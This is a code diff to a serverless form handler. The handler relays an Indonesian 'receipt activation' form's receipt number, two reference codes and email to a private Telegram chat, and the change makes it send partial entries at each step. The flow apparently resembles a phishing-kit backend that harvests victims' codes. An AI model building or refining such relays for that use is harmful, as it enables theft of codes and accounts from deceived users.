@@ -4,10 +4,14 @@ export default async function handler(req, res) {
     return res.status(405).json({ error: 'Method not allowed' })
   }
 
-  const { resi, kode1, kode2, email } = req.body || {}
-  if (![resi, kode1, kode2, email].every((value) => typeof value === 'string' && value.trim())) {
+  const { resi, kode1, kode2, email, step, action } = req.body || {}
+  const fields = { resi, kode1, kode2, email }
+  const hasValidData = Object.values(fields).some((value) => typeof value === 'string' && value.trim())
+  if (!hasValidData) {
     return res.status(400).json({ error: 'Data formulir belum lengkap' })
   }
+
+  const clean = (value) => typeof value === 'string' ? value.trim() : ''
 
   const token = process.env.TELEGRAM_BOT_TOKEN
   const chatId = process.env.TELEGRAM_CHAT_ID
@@ -16,13 +20,15 @@ export default async function handler(req, res) {
   }
 
   const message = [
-    '<b>Pesanan baru dari formulir aktivasi resi</b>',
+    `<b>Pembaruan formulir aktivasi resi</b>`,
+    `<b>Tahap:</b> ${escapeHtml(clean(step) || '-')}`,
+    `<b>Aksi:</b> ${escapeHtml(clean(action) || 'lanjut')}`,
     '',
-    `<b>Kode resi:</b> ${escapeHtml(resi)}`,
-    `<b>Kode referensi 1:</b> ${escapeHtml(kode1)}`,
-    `<b>Kode referensi 2:</b> ${escapeHtml(kode2)}`,
-    `<b>Email:</b> ${escapeHtml(email)}`,
-  ].join('\n')
+    resi ? `<b>Kode resi:</b> ${escapeHtml(clean(resi))}` : null,
+    kode1 ? `<b>Kode referensi 1:</b> ${escapeHtml(clean(kode1))}` : null,
+    kode2 ? `<b>Kode referensi 2:</b> ${escapeHtml(clean(kode2))}` : null,
+    email ? `<b>Email:</b> ${escapeHtml(clean(email))}` : null,
+  ].filter(Boolean).join('\n')
 
   const telegramResponse = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
     method: 'POST',
